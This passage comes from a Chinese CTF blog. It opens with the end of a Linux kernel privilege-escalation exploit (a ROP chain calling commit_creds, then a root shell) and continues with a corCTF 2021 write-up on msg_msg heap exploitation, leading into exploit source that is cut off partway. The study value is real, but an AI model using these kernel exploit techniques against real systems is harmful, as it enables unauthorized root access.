ret=ret-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line"></span><br><span class="line">    seq_operation[<span class="number">0</span>]=<span class="number">0xffffffff81019d8b</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;seq&quot;</span>, seq_operation, <span class="number">0x20</span>, <span class="number">0</span>);</span><br><span class="line">    __asm__(</span><br><span class="line">            <span class="string">&quot;mov r15, pop_rdi_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, init_cred;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, commit_cred;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, pop_rdi_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9,  kpti_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8,  0xbeefdead;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, 0x200;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">        );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid:%d\n&quot;</span>,getuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h2><p>于利用的意义就是可以有这样的通解了，以后低版本doublefree可以一把梭了，于我的意义就是终于不是看着别人wp复现出来的了，而是自己按照自己思路并且成功提权的内核利用。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/16/corCTF-2021-Wall-Of-Perdition-msg%E7%AC%AC%E4%BA%8C%E5%BC%B9/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/16/corCTF-2021-Wall-Of-Perdition-msg%E7%AC%AC%E4%BA%8C%E5%BC%B9/" class="post-title-link" itemprop="url">corCTF 2021 Wall Of Perdition&msg第二弹</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-11-16 21:18:18" itemprop="dateCreated datePublished" datetime="2022-11-16T21:18:18+08:00">2022-11-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-11-17 22:03:57" itemprop="dateModified" datetime="2022-11-17T22:03:57+08:00">2022-11-17</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>msg在许多内核cve中都有使用，所以利用这道题再加深一下对msg的理解，然后看看能不能复现个内核cve。</p>
<p>这个是corctf2021内核题的困难模式，简单模式是0x1000的object利用，困难模式是0x40的object利用。比之0x1000的利用确实麻烦很多，在0x1000的object利用中，如果控制了msg的前0x28个字节的话，就可以直接利用msg的<code>m_ts</code>和<code>next</code>完成内核地址的泄露以及配合<code>userfault</code>的任意地址写。</p>
<p>在0x40的利用中，泄露地址和0x1000并没有什么特别的地方，主要的差别出现在了任意地址写上面,其中利用msg进行任意地址写的内核代码如下,就算能够修改msg.next,但是写的长度早已经被记录到了len变量中，所以向next写值的时候相当于执行了<code>copy_from_user(seg + 1, src, 0)</code>,就没有向next中写值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经过这道题目的作者的研究，依旧发现了一个只利用msg进行任意写的思路，看完后不得不说一句好牛😻。</p>
<p>在简单模式中，其实忽略一个msg的利用方式，那就是任意free,在msgrev()中会把找到的msg以及对应的段都给free掉，然后把这个msg从<code>msg_queue</code>中脱链，所以如果能控制<code>msg</code>的话可以控制next让其指向一个object地址，然后再<code>msgrcv()</code>,如果伪造next合理的话，就会把next给free掉了，这就构成了任意地址free的效果。</p>
<p>在小于0x1000尺寸的object的msg利用中，就是先进行任意free,然后通过任意free构造出任意地址写，具体思路如下</p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p><strong>1</strong>.首先操作如下，申请三个msg_id,然后向msg_id[0]申请一个0x40大小的msg,这个msg是可以控制的，向msg_id[1]申请两个msg，第一个大小是0x40,第二个大小是0x2000。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msg_id[<span class="number">0</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">msg_id[<span class="number">1</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">msg_id[<span class="number">2</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">add_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">   dup_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">   del_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">   msg-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">   <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x61</span>,<span class="number">0x1000</span>);</span><br><span class="line">   send_msg(msg_id[<span class="number">0</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">   <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x62</span>,<span class="number">0x1000</span>);</span><br><span class="line">   send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">   <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x63</span>,<span class="number">0x1000</span>);</span><br><span class="line">   send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x1fc8</span>,IPC_NOWAIT);</span><br></pre></td></tr></table></figure>

<p>然后0x40的slab上可能出现的情况如图，改大上面的msg的<code>m_ts</code>就可以越界读了，最主要的是读到msg_id[1]的0x40的msg的ll_prev,ll_next,其中ll_prev指向了msg_id[1]的msg_queue,ll_next指向了msg_id[1]的下一个0x2000的msg，然后还可以根据这个越界读泄露内核地址，但是这个内核地址的选择不能被fg_kaslr影响，我选择的是<code>error_injection_list</code>这个指向内核数据段的地址算出kernelbase。</p>
<p><img src="https://syst3mfailure.io/assets/images/wall_of_perdition/1.png" alt="debug"></p>
<p> <strong>2</strong>.再利用msg_id[0]的msg进行任意读，读取当前进程的<code>task_struct</code>，这个和简单模式一样就不赘述。</p>
<p><strong>3</strong>.构造任意free,首先把msg_id[1]的所有msg全部释放，由于这个内核是slab分配，且slab是后进先出的，在释放0x2000的msg的时候首先释放msg_msg,然后再释放他的段，所以当再使用msg_id[2]申请一个0x2000的msg的时候，之前的段就被当成msg_msg,原先的msg_msg就被当成段了，再加上如果申请这个msg的时候msgsnd传入的是一个userfault检测的页，此时再让msg_id[0]的msg的next指向这个段再释放这个msg,就会把刚才申请的段给释放掉，图示如下</p>
<p><img src="https://syst3mfailure.io/assets/images/wall_of_perdition/5.png" alt="debug"></p>
<p>再释放</p>
<p><img src="https://syst3mfailure.io/assets/images/wall_of_perdition/9.png" alt="debug"></p>
<p>此时就相当于任意free了，但是free的是个正在初始化的msg的段，我们随时可以向这个被free的段里写入数据。</p>
<p><strong>4</strong>.任意写，此时msg_id[2]的msg.next指向被free的4K页，且能随时向这个页面里写入数据，所以可以再申请一个0x1000-0x30+0x10的msg把这个页再申请出来当新的msg的msg_msg，申请这个页的时候传入的用户态的内存也是被userfault检测的。</p>
<p>到这里就有两个come_from_user()被卡主了，如图所示，我们先让红色的msg通过，这样就能修改蓝色的msg_msg了，修改这个msg_msg的next为任意地址，然后再让蓝色的msg通过，这样在初始化这个msg的段的时候就会向任意地址写任意内容了。</p>
<p><img src="https://syst3mfailure.io/assets/images/wall_of_perdition/10.png" alt="debug"></p>
<p>感觉自己讲的很坨屎一样。。。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>思路比较饶，但总结来看最后实现任意地址写还是通过控制一个4K大小的msg_msg来完成的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;byteswap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reboot.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> page_size 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RULE 0x1337babe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELETE_RULE 0xdeadbabe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EDIT_RULE 0x1337beef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW_RULE 0xdeadbeef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DUP_RULE 0xbaad5aad</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INBOUND 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OUTBOUND 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SKIP -1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">&#125; User_rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> ip;</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">uint8_t</span> is_duplicated;</span><br><span class="line">&#125; Rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;user_msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ll_next;</span><br><span class="line">    <span class="keyword">void</span> *ll_prev;</span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;</span><br><span class="line">    <span class="keyword">void</span> *next;</span><br><span class="line">    <span class="keyword">void</span> *security;</span><br><span class="line">&#125;msg_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> msg_id[<span class="number">3</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">size_t</span> <span class="built_in">queue</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernelbase=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> page_msg=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_task=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_cred=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> current_task=<span class="number">0</span>,prev_task=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *page1=<span class="number">0</span>;</span><br><span class="line"><span 